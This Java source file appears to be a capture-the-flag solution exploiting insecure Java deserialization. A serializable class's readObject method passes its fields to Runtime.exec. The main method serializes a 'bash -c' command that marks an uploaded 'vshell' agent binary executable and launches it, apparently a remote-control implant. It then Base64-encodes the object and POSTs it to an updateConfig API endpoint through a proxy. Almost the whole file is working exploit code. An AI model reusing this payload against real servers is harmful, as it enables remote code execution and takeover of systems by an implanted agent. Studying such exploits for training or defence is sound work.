package dev.silente.javashark.solution;

import java.io.*;
import java.util.Base64;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.HttpHost;
import org.apache.http.util.EntityUtils;

class Ping implements Serializable {
    private static final long serialVersionUID = 1L;

    private String command;

    private String arg1;

    private String arg2;

    public void setCommand(String command) {
        this.command = command;
    }

    public void setArg1(String arg1) {
        this.arg1 = arg1;
    }

    public void setArg2(String arg2) {
        this.arg2 = arg2;
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        String[] cmdArray = { this.command, this.arg1, this.arg2 };
        Runtime.getRuntime().exec(cmdArray);
    }
}

public class BaiLu2023 {
    public static void main(String[] args) throws Exception {
        String poc2 = "chmod +x /app/Upload/vshell_agent_linux_amd64_lite && /app/Upload/vshell_agent_linux_amd64_lite";
        Ping ping=new Ping();
        ping.setCommand("bash");
        ping.setArg1("-c");

        ping.setArg2(poc2);
        String payload=Base64.getEncoder().encodeToString(serialize(ping));
        String url = "http://ip:port/internalApi/v3.2/updateConfig";
        String proxyHost = "127.0.0.1";
        int proxyPort = 8080;
        System.out.println(sendExp(payload,url, proxyHost, proxyPort));
    }
    public static String sendExp(String exp, String url, String proxyHost, int proxyPort) {
        try {
            HttpHost proxy = new HttpHost(proxyHost, proxyPort);
            RequestConfig requestConfig = RequestConfig.custom().setProxy(proxy).build();
            CloseableHttpClient httpClient = HttpClients.custom()
                    .setDefaultRequestConfig(requestConfig)
                    .build();
            HttpPost httpPost = new HttpPost(url);
            StringEntity entity = new StringEntity(exp);
            httpPost.setEntity(entity);
            HttpResponse response = httpClient.execute(httpPost);
            HttpEntity responseEntity = response.getEntity();
            String responseString = EntityUtils.toString(responseEntity);
            httpClient.close();
            return responseString;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public static byte[] serialize(Object yourObject) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream out = null;
        byte[] yourBytes;
        try {
            out = new ObjectOutputStream(bos);
            out.writeObject(yourObject);
            out.flush();
            yourBytes = bos.toByteArray();
        } finally {
            try {
                bos.close();
            } catch (IOException ex) {
                // ignore close exception
            }
        }
        return yourBytes;
    }
    public static Object deserialize(byte[] bytes) throws Exception{
        ByteArrayInputStream bis = new ByteArrayInputStream(bytes);
        ObjectInputStream ois = new ObjectInputStream(bis);
        bis.close();
        ois.close();
        return ois.readObject();
    }
}